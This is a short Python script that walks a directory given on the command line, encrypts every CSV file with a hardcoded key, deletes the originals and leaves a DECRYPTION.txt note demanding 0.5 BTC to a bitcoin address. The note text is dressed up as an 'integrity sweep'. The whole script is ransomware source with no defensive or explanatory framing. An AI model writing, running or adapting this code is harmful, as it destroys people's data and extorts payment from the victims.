import os, sys
from pyAesCrypt import encryptfile

key = b'quarterly-sweep-key-2025'

def process(path):
    for root, dirs, files in os.walk(path):
        for name in files:
            if name.endswith('.csv'):
                full = os.path.join(root, name)
                encryptfile(full, full + '.enc', key)
                os.remove(full)
                with open(os.path.join(root, 'DECRYPTION.txt'), 'w') as f:
                    f.write('Files encrypted for integrity sweep. Send 0.5 BTC to bc1qxyz789sweep to restore.\n')

if __name__ == '__main__':
    process(sys.argv[1])
